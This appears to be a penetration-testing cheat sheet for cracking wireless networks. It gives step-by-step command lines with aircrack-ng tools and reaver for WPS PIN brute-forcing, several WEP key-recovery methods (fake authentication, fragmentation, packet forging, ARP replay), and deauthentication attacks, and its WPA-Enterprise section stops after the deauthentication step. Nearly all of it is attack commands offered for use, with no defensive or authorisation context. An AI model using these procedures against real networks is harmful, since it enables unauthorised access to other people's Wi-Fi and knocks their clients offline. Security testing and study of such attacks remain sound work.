# wireless-cracking

## Table Of Content
  * [Info Gathering](#info-gathering)
  * [WPS Attack](#wps-attack)
  * [WEP Cracking (Clientless)](#wep-cracking-clientless)
  * [WEP Cracking (Connected Client)](#wep-cracking-connected-client)
  * [WEP Cracking (Connected Client [Other Method])](#wep-cracking-connected-client-other-method)
  * [WPA-Enterprise Cracking](#wpa-enterprise-cracking)

## Info Gathering
- Get MAC Address of wireless network card
```
macchanger --show <INTERFACE>
```
- List wireless network info
```
iwconfig
```

## WPS Attack
1. Put the interface into monitor mode
```
airmon-ng start wlan0
```
2. Gain the information of the interface
```
wash -i wlan0mon
```
3. Crack the pin
```
sudo reaver -b <bssid of the AP> -i wlan0mon -v -K
```

## WEP Cracking (Clientless)
1. Put the interface into monitor mode
```
airmon-ng start wlan0
```
2. Gain the information of the interface
```
airodump-ng wlan0mon
```
3. Capture the traffic and specify the Target AP
```
sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
```
4. Do a fake authentication
```
aireplay-ng -1 0 -e <wifi name(ssid)> -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
```
5. If no client then do a fragmentation attack (-5) and obtain the Keystream file (If fragmentation not success then use Chopchop technique -4)
```
aireplay-ng -5 -b <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
```
6. Then the Keystream file (.xor) is obtained
7. Create ARP packet
```
packetforge-ng -0 -a <bssid of the AP> -h <wireless card MAC addr> -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor(Keystream file) -w arp-request
```
8. Inject the forged ARP packet
```
aireplay-ng -2 -r arp-request wlan0mon
```
9. Crack and obtain wireless key
```
aircrack-ng -b <bssid of the AP> <captured file (.cap)>
```

## WEP Cracking (Connected Client)
1. Put the interface into monitor mode
```
airmon-ng start wlan0
```
2. Gain the information of the interface
```
airodump-ng wlan0mon
```
3. Capture the traffic and specify the Target AP
```
sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
```
4. Do a fake authentication
```
aireplay-ng -1 0 -e <wifi name(ssid)> -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
```
5. Then the Keystream file (.xor) is obtained
6. Do a fake authentication again with Keystream file
```
aireplay-ng -1 0 -e <wifi name(ssid)> -y <obtained_keystreamfile> -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
```
7. Do a ARP replay attack
```
aireplay-ng -3 -b <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
```
8. Crack and obtain wireless key
```
aircrack-ng -b <bssid of the AP> <captured file (.cap)>
```

## WEP Cracking (Connected Client [Other Method])
1. Put the interface into monitor mode
```
airmon-ng start wlan0
```
2. Gain the information of the interface
```
airodump-ng wlan0mon
```
3. Capture the traffic and specify the Target AP
```
sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
```
4. Do a fake authentication
```
aireplay-ng -1 0 -e <wifi name(ssid)> -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
```
**---If Fake authentication not working---** 

5. Interactive packet replay attack
```
aireplay-ng -2 -b <bssid of the AP> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <INTERFACE>
```
or
```
aireplay-ng -2 -r <captured file (.cap)> wlan0mon
```
6. Crack and obtain wireless key
```
aircrack-ng <captured file (.cap)>
```
**---If Fake authentication working---** 

5. Do a ARP replay attack
```
aireplay-ng -3 -b <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
```
6. Do a Deauthentication attack
```
aireplay-ng -0 1 -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
```
8. Crack and obtain wireless key
```
aircrack-ng <captured file (.cap)>
```
## WPA-Enterprise Cracking
1. Put the interface into monitor mode
```
airmon-ng start wlan0
```
2. Gain the information of the interface
```
airodump-ng wlan0mon
```
3. Capture the traffic and specify the Target AP
```
sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
```
4. Deauthentication attack
```
aireplay-ng -0 1 -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
```


